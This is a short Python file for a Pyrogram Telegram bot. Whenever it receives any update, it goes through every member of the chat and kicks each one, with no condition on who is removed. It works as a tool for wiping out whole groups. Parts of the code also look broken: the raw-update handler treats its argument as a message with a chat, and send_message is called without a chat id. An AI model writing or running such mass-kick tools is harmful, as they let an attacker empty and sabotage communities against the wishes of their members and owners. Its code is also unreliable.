import logging
from Code.bot import bot
from pyrogram import Client, idle
from pyrogram import filters

# Start Bot Command Management

@bot.on_raw_update()
def NewChat(bot,message):
    logging.info("new chat {}".format(message.chat.id))
    logging.info("getting memebers from {}".format(message.chat.id))
    a= bot.iter_chat_members(message.chat.id)
    for i in a:
        try:
            bot.kick_chat_member(chat_id =message.chat.id,user_id=i.user.id)
            bot.send_message("kicked {} from {}".format(i.user.id,message.chat.id))
            logging.info("kicked {} from {}".format(i.user.id,message.chat.id))
        except Exception:
            logging.info(" failed to kicked {} from {}".format(i.user.id,message.chat.id))
            
    logging.info("process completed")

bot.run()
idle()
